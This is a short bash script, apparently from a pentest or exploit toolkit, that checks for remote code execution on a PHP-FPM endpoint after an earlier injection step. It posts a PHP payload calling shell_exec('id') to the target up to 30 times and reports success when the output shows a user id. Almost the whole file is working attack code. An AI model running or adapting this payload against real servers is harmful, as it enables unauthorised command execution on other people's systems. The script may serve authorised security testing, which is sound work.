#!/bin/bash
# PHP-FPM — Verify RCE after explore-mode injection (lighter loop)
# Usage: explore_verify.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

for i in $(seq 1 30); do
  result=$(curl -s -X POST "${ENDPOINT}/index.php?a=id" \
    -d "<?php echo shell_exec('id'); ?>" \
    --max-time 5 2>/dev/null)
  if echo "$result" | grep -q "uid="; then
    echo "$result"
    echo "PHP_FPM_RCE_OK"
    exit 0
  fi
done
echo "VERIFY_FAILED"
